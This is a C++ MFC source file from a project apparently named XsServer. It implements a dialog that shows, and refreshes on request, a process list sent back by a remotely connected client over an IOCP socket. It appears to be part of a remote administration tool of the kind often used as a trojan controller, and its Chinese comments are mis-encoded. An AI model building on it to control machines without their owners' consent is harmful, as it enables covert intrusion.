// DlgProcessManager.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "XsServer.h"
#include "DlgProcessManager.h"
#include "afxdialogex.h"


// CDlgProcessManager �Ի���

IMPLEMENT_DYNAMIC(CDlgProcessManager, CDialog)

CDlgProcessManager::CDlgProcessManager(CWnd* pParent,
	_CIOCPServer* IOCPServer, PCONTEXT_OBJECT ContextObject)
	: CDialog(IDD_DIALOG_PROCESS_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;
	

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
}

CDlgProcessManager::~CDlgProcessManager()
{
}

void CDlgProcessManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_DIALOG_PROCESS_MANAGER_SHOW, m_CListCtrl_Dialog_Process_Manager_Show);
}


BEGIN_MESSAGE_MAP(CDlgProcessManager, CDialog)
	ON_WM_CLOSE()
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_LIST_DIALOG_PROCESS_MANAGER_SHOW, &CDlgProcessManager::OnNMCustomdrawListDialogProcessManagerShow)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_DIALOG_PROCESS_MANAGER_SHOW, &CDlgProcessManager::OnNMRClickListDialogProcessManagerShow)
	ON_COMMAND(ID_MENU_DIALOG_PROCESS_MANAGER_LIST_SHOW_REFRESH, &CDlgProcessManager::OnMenuDialogProcessManagerListShowRefresh)
END_MESSAGE_MAP()


// CDlgProcessManager ��Ϣ�������


BOOL CDlgProcessManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_IconHwnd, FALSE);
	//��ÿͻ���IP��ַ
	CString v1;
	sockaddr_in ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength);
	v1.Format("\\\\%s - Զ�̽��̹���", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//���öԻ������
	SetWindowText(v1);

	//���öԻ����ϵ�����
	LOGFONT LogFont;
	CFont* v2 = m_CListCtrl_Dialog_Process_Manager_Show.GetFont();
	v2->GetLogFont(&LogFont);
	//����Height Width����
	LogFont.lfHeight = LogFont.lfHeight*1.3;   //�޸�����ĸ߱���
	LogFont.lfWidth = LogFont.lfWidth*1.3;     //�޸�����Ŀ����
	CFont v3;
	v3.CreateFontIndirect(&LogFont);
	m_CListCtrl_Dialog_Process_Manager_Show.SetFont(&v3);
	m_CListCtrl_Dialog_Process_Manager_Show.SetFont(&v3);
	v3.Detach();

	//���ض˴��ص�����
	char* BufferData = (char*)(m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(0));

	m_CListCtrl_Dialog_Process_Manager_Show.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);

	switch (BufferData[0])
	{
	case CLIENT_PROCESS_MANAGER_REPLY:
	{
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(0, "PID", LVCFMT_LEFT, 80);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(1, "���̾���", LVCFMT_LEFT, 80);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(2, "����·��", LVCFMT_LEFT, 250);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(3, "����λ��", LVCFMT_LEFT, 120);
		ShowProcessList();
		break;
	}
	default:
		break;
	}


	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
}
void CDlgProcessManager::OnClose()
{
	if (m_ContextObject != NULL)
	{
		m_ContextObject->DialogID = 0;
	    m_ContextObject->DialogHandle = NULL;
	    CancelIo((HANDLE)m_ContextObject->ClientSocket);
	    closesocket(m_ContextObject->ClientSocket);
	}
	CDialog::OnClose();
}
void CDlgProcessManager::ShowProcessList(void)
{
	char* BufferData = (char*)(m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(1));
	char* ProcessImageName = NULL;
	char* ProcessFullPath = NULL;
	char* IsWow64Process = NULL;
	DWORD Offset = 0;
	CString v1;
	m_CListCtrl_Dialog_Process_Manager_Show.DeleteAllItems();
	//������������ÿһ���ַ�
	int i;
	for (i = 0; Offset < m_ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength() - 1; i++)
	{
		HANDLE* ProcessID = (HANDLE*)(BufferData + Offset);        //����ID
		ProcessImageName = BufferData + Offset + sizeof(HANDLE);   //������
		ProcessFullPath = ProcessImageName + lstrlen(ProcessImageName) + 1;   //��������·��
		IsWow64Process = ProcessFullPath + lstrlen(ProcessFullPath) + 1;

		v1.Format("%5u", *ProcessID);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertItem(i, v1);    //���õ������ݼ��������б���

		m_CListCtrl_Dialog_Process_Manager_Show.SetItemText(i, 1, ProcessImageName);
		m_CListCtrl_Dialog_Process_Manager_Show.SetItemText(i, 2, ProcessFullPath);
		m_CListCtrl_Dialog_Process_Manager_Show.SetItemText(i, 3, IsWow64Process);
		//����ID����
		m_CListCtrl_Dialog_Process_Manager_Show.SetItemData(i, (DWORD_PTR)*ProcessID);
		//����������ݽṹ������һ��ѭ��
		Offset += sizeof(HANDLE) + lstrlen(ProcessImageName) + lstrlen(ProcessFullPath) + lstrlen(IsWow64Process) + 3;

	}

	v1.Format("������� / %d", i);
	LVCOLUMN v3;
	v3.mask = LVCF_TEXT;
	v3.pszText = v1.GetBuffer(0);
	v3.cchTextMax = v1.GetLength();
	m_CListCtrl_Dialog_Process_Manager_Show.SetColumn(3, &v3);  //���б�����ʾ�ж��ٸ�����
}
//������ɫ
void CDlgProcessManager::OnNMCustomdrawListDialogProcessManagerShow(NMHDR *pNMHDR, LRESULT *pResult)
{
	NMLVCUSTOMDRAW* pLVCD = reinterpret_cast<NMLVCUSTOMDRAW*>(pNMHDR);
	
	*pResult = CDRF_DODEFAULT;

	if (CDDS_PREPAINT == pLVCD->nmcd.dwDrawStage)
	{
		*pResult = CDRF_NOTIFYITEMDRAW;
	}
	else if (CDDS_ITEMPREPAINT == pLVCD->nmcd.dwDrawStage)
	{
		*pResult = CDRF_NOTIFYSUBITEMDRAW;
	}
	else if ((CDDS_ITEMPREPAINT | CDDS_SUBITEM) == pLVCD->nmcd.dwDrawStage)
	{
		COLORREF NewTextColor, NewBackgroundColor;
		int Item = static_cast<int>(pLVCD->nmcd.dwItemSpec);
		CString ProcessImageName = m_CListCtrl_Dialog_Process_Manager_Show.GetItemText(Item, 1);
		if (strcmp((const char*)ProcessImageName.GetBuffer(0), "explorer.exe") == 0)
		{
			NewTextColor = RGB(0, 0, 0);   //��ɫ
			NewBackgroundColor = RGB(0, 255, 255);  //��ɫ
		}
		//else if(wcsicmp(const WCHAR*)ProcessImageName.GetBuffer(0), L"") == 0)
		else if (strcmp((const char*)ProcessImageName.GetBuffer(0), "Calculator.exe") == 0)
		{
			NewTextColor = RGB(0, 0, 0);   //��ɫ
			NewBackgroundColor = RGB(0, 0, 255);  //��ɫ
		}
		else
		{
			NewTextColor = RGB(0, 0, 0);
			NewBackgroundColor = RGB(255, 255, 255);  //��ɫ
		}

		pLVCD->clrText = NewTextColor;
		pLVCD->clrTextBk = NewBackgroundColor;
		*pResult = CDRF_DODEFAULT;

	}
}
//�Ҽ��˵���ʾ
void CDlgProcessManager::OnNMRClickListDialogProcessManagerShow(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	
	CMenu Menu;
	Menu.LoadMenu(IDR_MENU_DIALOG_PROCESS_MANAGER_LIST_SHOW_MAIN);
	CPoint Point;
	GetCursorPos(&Point);
	SetForegroundWindow();
	Menu.GetSubMenu(0)->TrackPopupMenu(TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
		Point.x, Point.y, this, NULL);
	*pResult = 0;
}
//ˢ�½����б�
void CDlgProcessManager::OnMenuDialogProcessManagerListShowRefresh()
{
	BYTE IsToken = CLIENT_PROCESS_MANAGER_REFRESH_REQUEST;
	m_IOCPServer->OnPrepareSending(m_ContextObject, &IsToken, 1);
}
void CDlgProcessManager::WindowHandleIO(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	switch (m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(0)[0])
	{
	case CLIENT_PROCESS_MANAGER_REPLY:
	{
		ShowProcessList();
		break;
	}
	}

}